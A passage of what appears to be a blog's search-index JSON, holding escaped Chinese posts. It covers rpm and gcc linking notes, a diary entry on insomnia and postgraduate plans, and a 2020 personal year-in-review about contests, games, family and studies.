rpm -qf file file: \u67e5\u770b\u6587\u4ef6\u5c5e\u4e8e\u54ea\u4e2a\u5305\n rpm -ql pkg list: \u67e5\u770b\u5305\u5b89\u88c5\u7684\u6587\u4ef6\u7684\u8def\u5f84\n rpm -qR pkg \u4f9d\u8d56\n rpm -qc pkg conf: \u67e5\u770b\u5305\u7684\u914d\u7f6e\u6587\u4ef6\n    (\u672a\u5b89\u88c5\u52a0\u4e2a p \u9009\u9879\uff0c\u4e14\u9700\u8981\u6709\u5305\u7684 rpm \u6587\u4ef6)\n rpm -qpl xxx.rpm\n3. gcc -l \u9009\u9879\u4e0e LD_LIBRARY_PATH\n \u7f16\u8bd1\u65f6\uff0c\u5982\u679c\u4e0d\u94fe\u63a5\u5e93 (\u9759\u6001/\u52a8\u6001) \u4f1a\u51fa\u73b0 undefined reference:\n  [mpiuser@izwz9fx70wphqjnuv22919z dynamic_lib]$ gcc -I./include -std=c99 -o Test Test.c\n  /tmp/cc4vyXu4.o: In function `main':\n  Test.c:(.text+0x302): undefined reference to `mult_s'\n  collect2: error: ld returned 1 exit status\n \u4e14\u5982\u679c\u5e93\u4e0d\u5728\u6807\u51c6\u4f4d\u7f6e\u5982/usr/lib/\u5904\u7684\u8bdd (\u53ef\u901a\u8fc7 gcc -lc --verbose \u67e5\u770b\uff0clc \u4ee3\u8868 libc.a, \u53ef\u6362\u6210\u5176\u4ed6\u5e93)\uff0c\u9700\u8981\u6dfb\u52a0-L \u9009\u9879\uff0c\n \u5426\u5219\u4f1a\u62a5/usr/bin/ld: cannot find: \n  [mpiuser@izwz9fx70wphqjnuv22919z dynamic_lib]$ gcc -I./include -lfpu -std=c99 -o Test Test.c\n  /usr/bin/ld: cannot find -lfpu\n  collect2: error: ld returned 1 exit status\n \u8fd0\u884c\u65f6\uff0c\u5982\u679c\u94fe\u63a5\u5e93\u4e0d\u5728/etc/ld.so.conf \u91cc\u7684\u8bdd\uff0c\u9700\u8981\u5b9a\u4e49\u73af\u5883\u53d8\u91cf LD_LIBTARY_PATH \u624d\u80fd\u8fd0\u884c\n \u5426\u5219\u4f1a\u62a5 cannot open shared object file:\n  [mpiuser@izwz9fx70wphqjnuv22919z dynamic_lib]$ bin/Test_shared\n  bin/Test_shared: error while loading shared libraries: libfpu.so: cannot open shared object file: No such file or directory\n</code></pre>","tags":["ASC"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/02/14/2020-02-14-%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%A4%B1%E7%9C%A0/","title":"\u8bb0\u5f55\u4e00\u6b21\u5931\u7720","text":"<p>\u4eca\u5929\u67e5\u4e86\u4e00\u4e9b\u5173\u4e8e\u4fdd\u7814\u7684\u4e8b\uff0c \u665a\u4e0a\u6709\u70b9\u5931\u7720\u3002 \u6211\u56de\u987e\u4e86\u4ee5\u5f80\u7684\u4e8b\uff0c \u6709\u521d\u4e2d\u8fd8\u6709\u9ad8\u4e2d\u3002</p> <p>\u6211\u56de\u5fc6\u8d77\u90a3\u65f6\u81ea\u5df1\u662f\u600e\u6837\u7684\u6a21\u6837\uff0c \u6211\u611f\u6168\u6709\u4e9b\u4e8b\u4e0d\u8bb0\u5f55\u4e5f\u8bb8\u5c31\u771f\u7684\u5fd8\u4e86\u3002 \u6211\u660e\u767d\u5982\u679c\u4e0d\u7ecf\u5e38\u773a\u671b\u4e00\u4e0b\u8fdc\u65b9\uff0c \u800c\u53ea\u662f\u4f4e\u5934\u770b\u7740\u73b0\u5728\uff0c \u65f6\u95f4\u4e5f\u8bb8\u7728\u773c\u5c31\u8fc7\u53bb\u4e86\u3002</p> <p>\u8981\u5bf9\u77ed\u671f\u7684\u672a\u6765\u6709\u6240\u8ba1\u5212\uff0c \u8ba1\u5212\u4e0d\u662f\u4e00\u4e2a\u4e25\u683c\u7684\u65e5\u7a0b\u8868\uff0c \u8ba9\u81ea\u5df1\u5931\u53bb\u81ea\u7531\uff0c \u800c\u662f\u660e\u767d\u4f60\u6700\u8fd1\u6700\u60f3\u505a\u4ec0\u4e48\uff0c \u4f60\u73b0\u5728\u60f3\u505a\u4ec0\u4e48\u3002</p> <p>\u6211\u60f3\u8981\uff1a 1 \u6211\u60f3\u8981\u7ec3\u4e60\u53e3\u8bed\uff0c\u4e3a\u590f\u4ee4\u8425\u7684\u82f1\u8bed\u81ea\u6211\u4ecb\u7ecd\u505a\u51c6\u5907 2 \u6211\u60f3\u8981\u8054\u7cfb\u4e00\u4e9b\u540c\u5b66\uff0c\u548c\u4ed6\u4eec\u804a\u804a\u672a\u6765\u3002\u5fc5\u5b9a\u6709\u6240\u6536\u83b7\u3002 3 \u6211\u60f3\u6709\u4e00\u4e2a\u7231\u597d\uff0c\u5982\u5b66\u4f1a\u57fa\u7840\u7684\u65e5\u8bed\u3002 4 \u6211\u60f3\u5728\u7f16\u7a0b\u80fd\u529b\uff08\u6570\u636e\u7ed3\u6784\u548c\u7b97\u6cd5\uff09\u4e0a\u6709\u6240\u63d0\u9ad8\u3002</p> <p>\u6211\u53d1\u73b0\u5217\u51fa\u613f\u671b\u80fd\u8ba9\u81ea\u5df1\u66f4\u52a0\u660e\u786e\u65b9\u5411\u3002</p>","tags":["\u4fdd\u7814"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/","title":"\u5173\u4e8e 2020 \u5230\u76ee\u524d\u7684\u4e00\u4e2a\u603b\u7ed3","text":"<p>2020 \u5e74\u5bf9\u5168\u4eba\u7c7b\u6765\u8bf4\u662f\u4e0d\u5e73\u51e1\u7684\u4e00\u5e74\uff0c\u800c\u5bf9\u6211\u6765\u8bf4\u4e5f\u662f\u4e0d\u540c\u5bfb\u5e38\u7684\u4e00\u5e74\u3002\u8fd9\u4e00\u5e74\u53d1\u751f\u4e86\u8bb8\u591a\u5927\u5927\u5c0f\u5c0f\u7684\u4e8b\uff0c\u6709\u4e9b\u4e8b\u60c5\u8eab\u5904\u5176\u4e2d\u65f6\u89c9\u5f97\u975e\u5e38\u4e0d\u5f97\u4e86\uff0c\u800c\u7ecf\u5386\u8fc7\u540e\uff0c\u53c8\u89c9\u5f97\u4e5f\u8bb8\u5f88\u5feb\u5c31\u4f1a\u5fd8\u8bb0\uff0c\u56e0\u6b64\u60f3\u8bb0\u5f55\u4e00\u4e9b\u8fd9\u4e00\u5e74\u6211\u90fd\u5e72\u4e86\u4e9b\u4ec0\u4e48\u4e8b\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u5bd2\u5047","title":"\u5bd2\u5047","text":"","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#wwh-\u7684\u91cd\u5e86\u4e4b\u65c5","title":"wwh \u7684\u91cd\u5e86\u4e4b\u65c5","text":"<p>\u5b66\u6821\u653e\u5047\u4e86\uff0cwwh \u7b2c\u4e00\u6b21\u6765\u91cd\u5e86\u627e\u6211\u73a9\u3002\u6211\u4eec\u4e00\u5171\u73a9\u4e86 3 \u5929\uff0c\u53bb\u7535\u5f71\u9662\u770b\u4e86\u7d2b\u7f57\u5170\u7684\u6c38\u6052\u82b1\u56ed\uff0c\u53bb\u4e86\u5ddd\u5916\u627e\u4e86 chq\uff0c\u53bb\u4e86\u78c1\u5668\u53e3\uff0c\u767d\u516c\u9986\u3002\u6700\u540e\u4e00\u8d77\u5750\u706b\u8f66\u5367\u94fa\u56de\u5bb6\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u5bb6\u91cc\u5c0f\u72d7\u7684\u6210\u957f","title":"\u5bb6\u91cc\u5c0f\u72d7\u7684\u6210\u957f","text":"<p>\u5bb6\u91cc\u7684\u5927\u72d7\u548c\u80d6\u5b50\u90fd\u4e0b\u4e86\u5c0f\u72d7\uff0c\u5bd2\u5047\u5728\u5bb6\u671f\u95f4\u89c1\u8bc1\u4e86\u4ed6\u4eec\u4ece\u5c0f\u4e0d\u70b9\uff0c\u5230\u53ef\u4ee5\u5728\u6ee1\u9662\u5b50\u8dd1\u7684\u5168\u8fc7\u7a0b\u3002</p> <p>\u5927\u72d7\u4e0b\u7684\u5c0f\u72d7\u6709 3 \u53ea\uff0c\u8981\u6bd4\u80d6\u5b50\u72d7\u4e0b\u7684 6 \u53ea\u80d6\u8bb8\u591a\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#asc-\u8d85\u7b97\u6bd4\u8d5b","title":"ASC \u8d85\u7b97\u6bd4\u8d5b","text":"<p>\u7531\u4e8e\u53c2\u52a0\u4e86 ASC \u7684\u8d85\u7b97\u6bd4\u8d5b\uff0c\u6240\u4ee5\u5e73\u65f6\u4e5f\u4f1a\u6298\u817e\u4e00\u4e0b linux\uff0c\u4f46\u8fdb\u5c55\u7f13\u6162\uff0c\u505a\u4e86\u7b2c\u4e00\u4e2a\u4f18\u5316 HPL \u540e\u5c31\u6ca1\u6709\u5f04\u4e86\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#switch","title":"Switch","text":"<p>\u59d0\u59d0\u56de\u5bb6\u4e86\uff0c\u53ef\u4ee5\u73a9<sub>~switch</sub>~\u585e\u5c14\u8fbe\u4e86</p> <p>\u521a\u5f00\u59cb\u5728 switch \u7684\u638c\u673a\u5c4f\u5e55\u4e0a\u73a9\u59cb\u7ec8\u4e0d\u8fc7\u763e\uff0c\u4e8e\u662f\u6211\u63d0\u8bae\u5bb6\u91cc\u6362\u7535\u89c6\uff0c\u6700\u540e\u4e70\u4e86\u5c0f\u7c73\u7684 55 \u82f1\u5bf8\u7684\u7535\u89c6\u3002\u7545\u6e38 hyrule \u5927\u9646\u7684\u611f\u89c9\u5b9e\u5728\u592a\u723d\u4e86\uff01</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u6298\u817e\u6a21\u62df\u5668","title":"\u6298\u817e\u6a21\u62df\u5668","text":"<p>\u5728\u5bb6\u6298\u817e\u6a21\u62df\u5668\uff0c\u4e0b\u4e86\u51e0\u767e G \u7684 wii, wiiu, 3ds \u7684\u6e38\u620f\u3002</p> <p>\u6210\u529f\u628a 3ds \u4e0a\u7684\u300a\u706b\u7130\u7eb9\u7ae0 - \u89c9\u9192\u300b\u63a8\u8350\u7ed9\u4e86 yxl\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u6811\u8393","title":"\u6811\u8393","text":"<p>yfh \u5bb6\u95e8\u53e3\u4ee5\u53ca\u9644\u8fd1\u7684\u9a6c\u8def\u65c1\u751f\u957f\u4e86\u4e00\u4e9b\u6811\u8393\uff0c\u6211\u4eec\u7ecf\u5e38\u53bb\u6458\u6765\u5403\u3002\u540e\u6765\u5728\u4e0a\u7f51\u8bfe\u524d\u751a\u81f3\u76f4\u63a5\u628a\u4e00\u9897\u6811\u8393\u79fb\u683d\u5230\u4e86\u6211\u5bb6\u9662\u5b50\u91cc\uff0c\u53ef\u4ee5\u4e0d\u5230\u51e0\u5929\u53f6\u5b50\u5c31\u67af\u9ec4\u4e86\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u8fc7\u5e74\u75ab\u60c5","title":"\u8fc7\u5e74&amp;\u75ab\u60c5","text":"<p>\u75ab\u60c5\u7206\u53d1\uff0c\u8fc7\u5e74\uff0c\u53e3\u7f69\uff0c\u5047\u671f\u4e00\u5929\u5929\u8fb9\u957f\u3002\u3002\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u4e00\u6b21\u4e0d\u6109\u5feb\u7684\u7ecf\u5386","title":"\u4e00\u6b21\u4e0d\u6109\u5feb\u7684\u7ecf\u5386","text":"<p>\u7238\u5988\u5435\u67b6\uff08\u56e0\u4e3a\u8205\u8205\u501f\u4e86\u5de5\u5177\u6ca1\u6709\u8fd8\uff0c\u5988\u5988\u5e2e\u8205\u8205\u8bf4\u8bdd\uff09\uff0c\u6211\u88ab\u6c14\u54ed\uff0c\u6211\u529d\u7238\u7238\u548c\u5988\u5988\u6539\u5584\u5173\u7cfb\uff0c\u8bf4\u4e86\u5f88\u591a\u5927\u9053\u7406\uff0c\u8bb8\u591a\u4e8b\u60c5\u5939\u6742\u5728\u4e00\u8d77\uff0c\u7238\u7238\u4e5f\u8bb8\u4e5f\u662f\u538b\u529b\u5f88\u5927\uff0c\u7b2c\u4e00\u6b21\u770b\u89c1\u7238\u7238\u6d41\u6cea\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u4e0a\u7f51\u8bfe\u4e86","title":"\u4e0a\u7f51\u8bfe\u4e86","text":"","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u7f51\u8bfe","title":"\u7f51\u8bfe","text":"<p>\u5f00\u59cb\u4e0a\u7f51\u8bfe\uff0c\u8f6f\u4ef6\u5de5\u7a0b\uff0c\u6570\u636e\u5e93\uff0c\u7f16\u8bd1\u539f\u7406\uff0c\u611f\u89c9\u4e0d\u662f\u5f88\u5b66\u5f97\u8fdb\u53bb\uff0c\u5c24\u5176\u662f\u8f6f\u4ef6\u5de5\u7a0b\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u846c\u793c","title":"\u846c\u793c","text":"<p>\u53c2\u52a0\u65e7\u5916\u516c\u7684\u846c\u793c\uff0c\u53bb\u4e86\u5370\u8c61\u4e2d\u5c0f\u65f6\u5019\u53bb\u8fc7\u7684\u516c\u5893\uff0c\u706b\u846c\u573a\uff0c\u5728\u6c7d\u8f66\u4e0a\u88ab\u8868\u54e5\u95ee\u8d77\u4fdd\u7814\u7684\u610f\u5411\uff0c\u5728\u90a3\u51e0\u5929\u60f3\u4e86\u5f88\u591a\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u5173\u4e8e\u5b9e\u4e60\u7684\u5fc3\u6001\u95ee\u9898","title":"\u5173\u4e8e\u5b9e\u4e60\u7684\u5fc3\u6001\u95ee\u9898","text":"<p>\u540c\u5b66\u4eec\u90fd\u5728\u73ed\u7fa4\u91cc\u53d1\u5b9e\u4e60\u9762\u8bd5\u7684\u4e8b\uff0c\u6211\u5374\u6ca1\u6709\u52c7\u6c14\u53bb\u62a5\u5b9e\u4e60\uff0c\u8bfe\u7a0b\u4e5f\u4e00\u62d6\u518d\u62d6\u3002\u6574\u4e2a\u5bd2\u5047\uff0c\u6211\u90fd\u5341\u5206\u5bb3\u6015\u522b\u4eba\u95ee\u6211\u5b9e\u4e60\u7684\u4e8b\u60c5\u3002\u88ab ltk \u95ee\u4e86\u4e4b\u540e\uff0c\u6211\u548c\u4ed6\u8bf4\u6211\u5fc3\u6001\u4e0a\u9047\u5230\u4e86\u4e00\u70b9\u95ee\u9898\u3002\u4ed6\u5b89\u6170\u4e86\u6211\uff0c\u8ddf\u6211\u8bb2\u4e86\u8bb8\u591a\uff0c\u5e76\u63a8\u8350\u4e86\u4e00\u4e9b\u5b9e\u4e60\uff0c\u6211\u5341\u5206\u611f\u8c22\u4ed6\u3002\u4f46\u662f\u540e\u6765\u6211\u8fd8\u662f\u6ca1\u6709\u89e3\u51b3\u5fc3\u6001\u4e0a\u7684\u95ee\u9898\uff0c\u4ecd\u7136\u6ca1\u6709\u53bb\u627e\u5b9e\u4e60\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u5f00\u5b66","title":"\u5f00\u5b66","text":"","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u8fd4\u7a0b","title":"\u8fd4\u7a0b","text":"<p>\u7531\u4e8e wgm \u4ed6\u4eec\u5728\u7fa4\u91cc\u8ba8\u8bba\u4e86\u673a\u7968\u7684\u4e8b\uff0c\u4e8e\u662f\u6211\u4fbf\u201c\u5077\u5077\u201d\u7684\u548c\u4ed6\u4eec\u4e70\u4e86\u540c\u4e00\u73ed\u98de\u673a\u3002</p> <p>\u5728\u8def\u4e0a\uff0c\u6211\u95ee\u4e86 wgm \u8ba1\u7ec4\u7684\u4e8b\uff0c\u4e5f\u4e86\u89e3\u5230\u4e86 hf \u4fdd\u7814\u7684\u4e8b\u60c5\u3002\u673a\u573a\u91cc\u4e00\u8d77\u6253\u51fa\u79df\u8f66\u56de\u5b66\u6821\uff0c0 \u70b9\u5230\u8fbe\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u8865\u7f16\u8bd1\u539f\u7406\u5b9e\u9a8c","title":"\u8865\u7f16\u8bd1\u539f\u7406\u5b9e\u9a8c","text":"<p>\u75af\u72c2\u8865\u7f16\u8bd1\u539f\u7406\u5b9e\u9a8c\uff0c\u8865\u4e86\u4e00\u4e2a\u661f\u671f\u3002\u6700\u540e\u7684\u6210\u54c1\u5728\u4e2d\u95f4\u4ee3\u7801\u751f\u6210\u90e8\u5206\u7f3a\u5c11\u5e03\u5c14\u8868\u8fbe\u5f0f\u7684\u7ffb\u8bd1\uff0c\u76ee\u6807\u4ee3\u7801\u751f\u6210\u5219\u5728\u5e26\u6709\u975e\u5e38\u591a\u524d\u63d0\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u51fd\u6570\u8c03\u7528\uff0c\u6700\u7ec8\u6210\u529f\u7f16\u8bd1\u4e86\u4e00\u4e2a\u5c0f\u7a0b\u5e8f\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u5b66\u6821\u5b9e\u4e60","title":"\u5b66\u6821\u5b9e\u4e60","text":"<p>\u5b66\u6821\u5b9e\u4e60\uff0c\u548c lh, xyh, lb, lg \u4e00\u7ec4\uff0c\u505a\u4e00\u4e2a\u4eff\u77e5\u4e4e\u7f51\u7ad9\u2014\u2014Behoo\uff0c\u8d1f\u8d23\u524d\u7aef\u3002\u5728\u6b64\u671f\u95f4\uff0c\u517b\u6210\u4e86\u53bb 5 \u98df\u5802\u5403\u996d\u7684\u4e60\u60ef\uff08\u6d88\u8d39\u6c34\u5e73\u9661\u5ced\u4e0a\u5347\uff09\u3002\u671f\u95f4\u6211\u7ed9\u4ed6\u4eec\u8bb2\u4e86\u5f88\u591a git \u7684\u4f7f\u7528\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u6691\u5047","title":"\u6691\u5047","text":"","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u7ebf\u4e0a\u590f\u4ee4\u8425","title":"\u7ebf\u4e0a\u590f\u4ee4\u8425","text":"<p>\u590f\u4ee4\u8425\uff0c\u9762\u8bd5\uff0c\u62a5\u4e86\u4e2d\u79d1\u5927\uff0c\u8ba1\u7b97\u6240\uff0c\u534e\u4e2d\u79d1\u5927 - \u56fd\u5149\uff0c\u4e0a\u6d77\u79d1\u6280\u5927\u5b66\uff0c\u56fd\u9632\u79d1\u5927\uff0c\u90fd\u662f\u504f\u7cfb\u7edf\u65b9\u5411\u7684\u3002\u5728\u5b9e\u9a8c\u5ba4\u51c6\u5907\u6750\u6599\u3001\u51c6\u5907\u9762\u8bd5\u7684\u65f6\u95f4\u5370\u8c61\u8fd8\u662f\u633a\u6df1\u523b\u7684\u3002\u6700\u7ec8\u88ab\u4e2d\u79d1\u5927\u5b89\u8679\u8001\u5e08\u7ec4\u5f55\u53d6\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u9f99\u82af\u676f-2020","title":"\u9f99\u82af\u676f 2020","text":"<p>\u9f99\u82af\u676f\uff0c\u521d\u8d5b\u4ece 7.15 \u65e5\u5f00\u59cb\u5230 8.5 \u65e5\u5f04\u4e86\u4e0d\u5230 3 \u4e2a\u661f\u671f\u3002</p> <p>\u8bb0\u5f97\u540e\u9762\u4e00\u4e2a\u661f\u671f\uff0c\u521a\u5f00\u59cb\u7684\u6027\u80fd\u4e0a\u677f\u4e0d\u901a\uff0c\u9891\u7387\u4e5f\u53ea\u6709 50M \u5de6\u53f3\uff0c\u5341\u5206\u90c1\u95f7\u3002\u540e\u9762 cache burst \u8c03\u901a\u4e86\uff0c\u9891\u7387\u4e5f\u795e\u5947\u5730\u63d0\u5347\u5230 90M\u3002\u518d\u5230\u540e\u6765\uff0c\u8c03\u6e05\u534e\u76d1\u63a7\u7a0b\u5e8f\u8fde\u7eed\u8c03\u4e86 3 \u5929\uff0c\u5dee\u70b9\u653e\u5f03\u3002\u603b\u4e4b\uff0c\u90a3\u6bb5\u65f6\u95f4\u5fc3\u60c5\u5c31\u8ddf\u5750\u8fc7\u5c71\u8f66\u4e00\u6837\uff0c\u5341\u5206\u523a\u6fc0\u3002</p> <p>\u51b3\u8d5b\u4ece 8.8 \u5230 8.20\uff0c\u4e3b\u8981\u6dfb\u52a0\u5b8c\u5584\u4e86 TLB\uff0c\u6dfb\u52a0\u4e86 100 \u6761\u6307\u4ee4\uff0c\u4ee5\u53ca\u8c03\u901a PMON\u3002</p> <p>\u51b3\u8d5b\u540c\u6837\u5341\u5206\u523a\u6fc0\uff0c\u4e2d\u95f4\u4e5f\u5dee\u70b9\u653e\u5f03\uff0c\u76f4\u5230\u6700\u540e\u4e00\u5929\u8c03\u901a\u4e86 PMON\uff0c\u5e76\u901a\u5bb5\u5199\u6587\u6863\u3002\u4e4b\u540e\u4fbf\u662f\u51c6\u5907\u7b54\u8fa9\uff0c\u672c\u6765\u8ba1\u5212\u6211\u6765\u8bb2\u7684\uff0c\u4f46\u662f\u6700\u540e\u4e00\u5929\u5403\u5348\u996d\u65f6\u8fd8\u662f\u51b3\u5b9a\u8ba9 lg \u6765\u8bb2\u4e86\uff08\u4ed6\u786e\u5b9e\u8981\u6d41\u7545\u4e9b\uff09\u3002\u4e0d\u8fc7\u5728\u56de\u7b54\u8bc4\u59d4\u6211\u4eec\u5bf9\u4e8e\u8dd1 linux \u6dfb\u52a0\u5916\u8bbe\u7684\u8ba1\u5212\u65f6\uff0c\u6211\u4eec\u6ca1\u6709\u7b54\u4e0a\u6765\uff0c\u6709\u4e9b\u9057\u61be\u3002\u6700\u540e\u83b7\u5f97\u4e86 2 \u7b49\u5956\u7684\u6210\u7ee9\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u5927\u56db","title":"\u5927\u56db","text":"","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#dnf","title":"DNF","text":"<p>\u60f3\u56de\u5fc6\u4e00\u4e0b\u4ee5\u524d\u73a9\u7684 DNF \u624b\u673a\u7248\uff08\u5973\u67aa\uff09\uff0c\u53d1\u73b0\u88c5\u5b89\u5353\u865a\u62df\u673a 4.4 \u4e5f\u6ca1\u529e\u6cd5\u89e3\u51b3\u521a\u5f00\u59cb\u7b2c\u4e00\u4e2a\u4efb\u52a1\u7684 bug\u3002\u770b\u6765\u53ea\u80fd\u5728\u8001\u624b\u673a\u624d\u80fd\u8fd0\u884c\u4ee5\u524d\u7684\u8001\u5e94\u7528\u4e86\u3002</p> <p>\u540e\u6765\u5c1d\u8bd5\u4e86\u4e00\u4e0b PC \u7684 dnf\uff0c\u5c1d\u8bd5\u4e86\u5973\u6f2b\u6e38\uff0c\u5973\u67aa\u70ae\uff0c\u67aa\u5251\u58eb\u3002\u4f46\u662f\u82e6\u4e8e PC \u7248\u7684 DNF \u7684\u4f53\u529b\u8bbe\u7f6e\uff0c\u4e00\u5929\u5e76\u4e0d\u80fd\u73a9\u5f88\u4e45\u3002\u4e8e\u662f\u4fbf\u7814\u7a76\u81ea\u5df1\u642d\u8bbe DNF \u670d\u52a1\u5668\uff0c\u6700\u540e\u5728\u865a\u62df\u673a\u4e0a\u642d\u5efa\u4e86 DNF \u670d\u52a1\u5668\uff0c\u5e76\u80fd\u591f\u8054\u673a\u3002\u4e0d\u8fc7\u7248\u672c\u6bd4\u8f83\u8001\uff0c\u4f1a\u51fa\u73b0\u7b49\u7ea7\u4e0d\u591f\u6ca1\u6709\u4efb\u52a1\u7684\u60c5\u51b5\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#cemu-\u585e\u5c14\u8fbe\u4f20\u8bf4\u8352\u91ce\u4e4b\u606f","title":"Cemu+ 